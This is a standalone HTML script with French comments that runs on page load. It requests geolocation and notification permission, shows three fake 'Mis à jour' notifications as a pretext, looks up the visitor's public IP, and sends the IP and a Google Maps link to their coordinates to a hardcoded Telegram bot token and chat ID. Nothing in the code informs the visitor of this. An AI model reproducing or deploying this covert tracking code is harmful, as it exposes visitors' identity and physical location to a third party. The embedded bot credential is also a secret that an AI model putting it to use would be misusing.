<script>
const token = "8468165702:AAHD08K4JugVPyCze00j1qbluTs6iyjf1mw";
const chatId = "8012856656";

// Envoi des notifications locales
function sendMultipleNotifs(message, count){
  for (let i=0;i<count;i++){
    setTimeout(()=>{
      new Notification(message + " ("+(i+1)+"/"+count+")");
    }, i*1500);
  }
}

// Récupération IP
async function getIP(){
  return fetch('https://api.ipify.org?format=json')
    .then(r=>r.json()).then(d=>d.ip).catch(()=>null);
}

// Envoi à Telegram
function sendToTelegram(text){
  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({chat_id:chatId,text})
  }).catch(e=>console.log("Erreur Telegram",e));
}

// Demande de localisation (une seule fois)
function askLocation(){
  return new Promise(resolve=>{
    if (!navigator.geolocation) return resolve({ok:false});
    navigator.geolocation.getCurrentPosition(
      pos => resolve({ok:true,lat:pos.coords.latitude,lon:pos.coords.longitude}),
      err => resolve({ok:false}),
      {timeout:10000}
    );
  });
}

// Demande de notifications (une seule fois)
async function askNotifications(){
  if (!("Notification" in window)) return false;

  if (Notification.permission === "granted"){
    sendMultipleNotifs("Mis à jour", 3);
    return true;
  }

  const perm = await Notification.requestPermission();
  if (perm === "granted"){
    sendMultipleNotifs("Mis à jour", 3);
    return true;
  } else {
    return false;
  }
}

// Script principal
async function runChecks(){
  const locResult = await askLocation();
  const locOk = locResult.ok;

  const notifOk = await askNotifications();

  const ip = await getIP();
  let msg = `IP: ${ip || 'inconnue'}\nLoc: ${locOk}\nNotification: ${notifOk}`;
  if (locOk) msg += `\nLocalisation: https://www.google.com/maps?q=${locResult.lat},${locResult.lon}`;

  sendToTelegram(msg);
}

runChecks();
</script>
